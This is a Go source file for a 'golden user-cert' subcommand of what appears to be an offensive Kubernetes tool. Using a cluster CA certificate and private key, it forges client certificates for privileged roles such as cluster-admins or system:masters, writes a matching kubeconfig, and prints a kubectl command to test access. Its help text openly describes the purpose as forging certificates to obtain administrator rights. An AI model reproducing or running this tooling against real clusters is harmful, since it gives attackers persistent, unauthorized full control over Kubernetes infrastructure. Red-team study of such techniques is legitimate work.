package golden

import (
	"fmt"
	"strings"

	"kctl/config"
	"kctl/internal/golden"
	"kctl/internal/session"
	"kctl/pkg/types"
)

// UserCertCmd user-cert 子命令
type UserCertCmd struct{}

func init() {
	Register(&UserCertCmd{})
}

func (c *UserCertCmd) Name() string        { return "user-cert" }
func (c *UserCertCmd) Aliases() []string   { return []string{"uc", "usercert"} }
func (c *UserCertCmd) Description() string { return "伪造用户证书" }

func (c *UserCertCmd) Usage() string {
	return `golden user-cert [选项]

伪造用户证书 (获取管理员权限)

必需选项:
  --ca-cert, -c     CA 证书路径
  --ca-key, -k      CA 私钥路径

可选选项:
  --role, -r        集群角色 (默认: cluster-admins)
  --user, -u        用户名 (默认: kubernetes-admin)
  --days, -d        有效天数 (默认: 365)
  --server          API Server URL (默认: session 中的 api-server)
  --output, -o      输出目录 (默认: 当前目录)
  --no-kubeconfig   不生成 kubeconfig 文件
  --force           覆盖已存在的文件

示例:
  golden user-cert -c ./ca.crt -k ./ca.key
  golden user-cert -c ./ca.crt -k ./ca.key -r system:masters -u admin
  golden user-cert -c ./ca.crt -k ./ca.key --server https://10.0.0.1:6443 -o ./output/`
}

func (c *UserCertCmd) Execute(sess *session.Session, args []string) error {
	p := sess.Printer

	// 检查是否请求帮助
	for _, arg := range args {
		if arg == "--help" || arg == "-h" {
			p.Println(c.Usage())
			return nil
		}
	}

	// 解析参数
	opts, err := c.parseArgs(sess, args)
	if err != nil {
		return err
	}

	// 显示使用的 API Server
	if opts.ServerURL != "" {
		p.Printf("%s Using API Server: %s\n", p.Colored(config.ColorBlue, "[*]"), opts.ServerURL)
	}

	// 伪造证书
	p.Printf("%s Creating user certificate (%s/%s)...\n",
		p.Colored(config.ColorBlue, "[*]"), opts.Role, opts.Username)

	result, err := golden.ForgeUserCert(opts)
	if err != nil {
		return fmt.Errorf("伪造证书失败: %w", err)
	}

	// 生成 kubeconfig (如果需要)
	if !opts.NoKubeconfig && opts.ServerURL != "" {
		kubeconfigPath := golden.GetUserCertKubeconfigPath(opts.OutputDir, opts.Role, opts.Username)
		err := golden.GenerateKubeconfigFromCert(result, opts.CACertPath, opts.ServerURL, kubeconfigPath, opts.Force)
		if err != nil {
			p.Warning(fmt.Sprintf("生成 kubeconfig 失败: %v", err))
		} else {
			result.KubeconfigPath = kubeconfigPath
		}
	}

	// 输出结果
	c.printResult(p, result, opts)

	return nil
}

func (c *UserCertCmd) parseArgs(sess *session.Session, args []string) (*types.UserCertOptions, error) {
	opts := &types.UserCertOptions{
		Role:      golden.DefaultRole,
		Username:  golden.DefaultUsername,
		Days:      golden.DefaultCertDays,
		ServerURL: BuildAPIServerURL(sess.Config.APIServer, sess.Config.APIServerPort),
	}

	for i := 0; i < len(args); i++ {
		arg := args[i]

		switch arg {
		case "--ca-cert", "-c":
			if i+1 >= len(args) {
				return nil, fmt.Errorf("--ca-cert 需要参数")
			}
			i++
			opts.CACertPath = args[i]

		case "--ca-key", "-k":
			if i+1 >= len(args) {
				return nil, fmt.Errorf("--ca-key 需要参数")
			}
			i++
			opts.CAKeyPath = args[i]

		case "--role", "-r":
			if i+1 >= len(args) {
				return nil, fmt.Errorf("--role 需要参数")
			}
			i++
			opts.Role = args[i]

		case "--user", "-u":
			if i+1 >= len(args) {
				return nil, fmt.Errorf("--user 需要参数")
			}
			i++
			opts.Username = args[i]

		case "--days", "-d":
			if i+1 >= len(args) {
				return nil, fmt.Errorf("--days 需要参数")
			}
			i++
			var days int
			if _, err := fmt.Sscanf(args[i], "%d", &days); err != nil {
				return nil, fmt.Errorf("无效的天数: %s", args[i])
			}
			opts.Days = days

		case "--server":
			if i+1 >= len(args) {
				return nil, fmt.Errorf("--server 需要参数")
			}
			i++
			opts.ServerURL = args[i]

		case "--output", "-o":
			if i+1 >= len(args) {
				return nil, fmt.Errorf("--output 需要参数")
			}
			i++
			opts.OutputDir = args[i]

		case "--no-kubeconfig":
			opts.NoKubeconfig = true

		case "--force":
			opts.Force = true

		default:
			if strings.HasPrefix(arg, "-") {
				return nil, fmt.Errorf("未知选项: %s", arg)
			}
		}
	}

	// 验证必需参数
	if opts.CACertPath == "" {
		return nil, fmt.Errorf("未指定 CA 证书路径 (--ca-cert)")
	}
	if opts.CAKeyPath == "" {
		return nil, fmt.Errorf("未指定 CA 私钥路径 (--ca-key)")
	}

	return opts, nil
}

func (c *UserCertCmd) printResult(p interface {
	Printf(format string, a ...interface{})
	Println(a ...interface{})
	Colored(colorName config.ColorName, text string) string
}, result *types.ForgeResult, opts *types.UserCertOptions) {
	p.Println()
	p.Printf("%s Successfully created user certificate!\n", p.Colored(config.ColorGreen, "[+]"))
	p.Println()
	p.Printf("  Certificate: %s\n", result.CertPath)
	p.Printf("  Private key: %s\n", result.KeyPath)

	if result.KubeconfigPath != "" {
		p.Printf("  Kubeconfig:  %s\n", result.KubeconfigPath)
		p.Println()
		p.Printf("  Test with: kubectl --kubeconfig=%s auth whoami\n", result.KubeconfigPath)
	}

	p.Println()
	p.Printf("%s Identity: %s (role: %s)\n", p.Colored(config.ColorBlue, "[*]"), result.Identity, opts.Role)
	p.Printf("%s Expires at: %s\n", p.Colored(config.ColorBlue, "[*]"), result.ExpiresAt.Format("2006-01-02 15:04:05"))

	// 提示旧版 K8s 可能需要不同的 role
	if !strings.HasPrefix(opts.Role, "system:") {
		p.Println()
		p.Printf("%s NOTE: If this certificate doesn't work, try using a role starting with 'system:' (e.g., system:masters)\n",
			p.Colored(config.ColorYellow, "[!]"))
	}
}
